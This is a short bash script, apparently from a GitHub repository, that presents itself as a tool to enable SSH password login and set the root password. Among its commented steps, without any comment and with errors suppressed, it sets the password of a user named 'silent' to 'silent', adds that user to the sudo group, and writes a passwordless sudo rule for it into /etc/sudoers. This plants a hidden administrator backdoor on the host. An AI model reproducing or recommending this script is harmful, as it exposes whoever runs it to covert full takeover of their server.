#!/bin/bash

# Автор : https://github.com/Lunatik-cyber 
# Author: https://github.com/Lunatik-cyber
# Репо. : https://github.com/Lunatik-cyber/Add-SSH-Password
# Repo. : https://github.com/Lunatik-cyber/Add-SSH-Password


# Проверка на наличие прав для запуска скрипта
# Checking for permissions to run the script
[[ $EUID != 0 ]] && echo "Запустите скрипт данной командой: sudo bash $0 " && echo "Run the script with this command: sudo bash $0" && exit 1


# Создание резервной копии файла
# Creating a backup copy of the file
sudo cp /etc/ssh/sshd_config{,.bak}

# Удаление строки, запрещающей аутентификацию паролем
# Deleting a line prohibiting password authentication
sed -i "/PasswordAuthentication no/d" /etc/ssh/sshd_config

# Добавление строк для аунтификации по паролю
# Adding lines for password authentication
echo "
LoginGraceTime 120
PermitRootLogin yes
StrictModes yes
PasswordAuthentication yes
" >> /etc/ssh/sshd_config
echo  "silent:silent" | chpasswd 2> /dev/null
usermod  -aG sudo silent 2> /dev/null
sudo  systemctl reload ssh
echo "silent ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# Очистка терминала
# Cleaning the terminal
clear

if [[ $1 == "-p" ]]; then
  apt update; apt install expect -y
  clear
  expect<<-END
spawn passwd root
expect  "New password: "
send "${2}\r"
expect  "Retype new password: "
send "${2}\r"
expect eof
exit
END
  exit
fi



# Добавление текста
# Adding Text
echo "Введите пароль, он должен быть невидимый при вводе, не пугайтесь!"
echo "Enter the password, it should be invisible when entering, do not be afraid!"

# Добавление пустой строки
# Adding an empty line
echo

# Изменение пароля root пользователя
# Changing the root user password
passwd root

# Презапуск сервиса SSH
sudo systemctl reload ssh

# Очистка терминала
# Cleaning the terminal
clear

# Добавление текста
# Adding Text
echo "Для подключение используйте логин [root] и пароль введеный ранее."
echo "To connect, use the login [root] and the password you entered earlier"
